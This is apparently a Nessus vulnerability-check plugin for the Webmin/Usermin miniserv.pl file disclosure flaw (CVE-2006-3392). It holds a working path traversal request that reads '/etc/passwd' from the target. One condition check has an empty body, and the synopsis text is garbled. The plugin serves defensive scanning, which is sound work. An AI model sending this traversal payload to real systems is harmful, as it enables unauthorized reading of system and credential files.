#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21785);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-3392");
  script_bugtraq_id(18744);
  script_xref(name:"OSVDB", value:"26772");

  script_name(english:"Webmin / Usermin miniserv.pl Arbitrary File Disclosure");
  script_summary(english:"Tries to read a local file using miniserv.pl");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure flaw. 
access." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Webmin or Usermin, web-based interfaces for
Unix / Linux system administrators and end-users. 

Webmin and Usermin both come with the Perl script 'miniserv.pl' to
provide basic web services, and the version of 'miniserv.pl' installed
on the remote host contains a logic flaw that allows an
unauthenticated attacker to read arbitrary files on the affected host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/changes-1.290.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/uchanges-1.220.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Webmin 1.290 / Usermin 1.220 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("webmin.nasl");
  script_require_ports("Services/www", 10000);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:10000, embedded: TRUE);
if (!get_kb_item("www/" + port + "/webmin"));
if (http_is_dead(port:port)) exit(0);


# Try to exploit the flaw to read a local file.
file = "/etc/passwd";
r = http_send_recv3(method:"GET", port:port,
  item:string("/unauthenticated", crap(data:"/..%01", length:60), file));
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res))
{
  report = string(
    "Here are the contents of the file '/etc/passwd' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_warning(port:port, extra:report);
}
